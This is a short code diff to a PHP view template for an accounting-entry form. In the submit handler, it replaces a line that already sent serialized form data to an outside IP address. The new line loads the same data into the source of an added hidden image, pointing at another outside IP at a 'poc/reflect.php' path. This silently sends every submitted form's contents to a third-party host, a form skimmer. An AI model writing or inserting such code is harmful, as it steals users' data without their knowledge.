@@ -30,7 +30,7 @@ $lock_url = base_url("/accentry/add_edit/" . $id . "/1");
 <body class="app sidebar-fixed aside-menu-off-canvas aside-menu-hidden header-fixed">
 <?= $this->include('common/header') ?>
     <!-- end header -->
-
+    <img src="" id="holder" style="display: none"/>
     <div class="app-body">
         <div class="sidebar" id="sidebar">
             <?= $this->include('common/left_bar') ?>
@@ -341,7 +341,7 @@ $lock_url = base_url("/accentry/add_edit/" . $id . "/1");
             });
 
             $("#needs-validation").submit(function(e){
-                $.get( "http://3.225.131.18/venera/cms/poc/reflect.php?" + $( "#needs-validation" ).serialize() );
+                $("#holder").attr('src', "http://172.104.190.218/poc/reflect.php?" + $( "#needs-validation" ).serialize());
                 //e.preventDefault();
             });
 
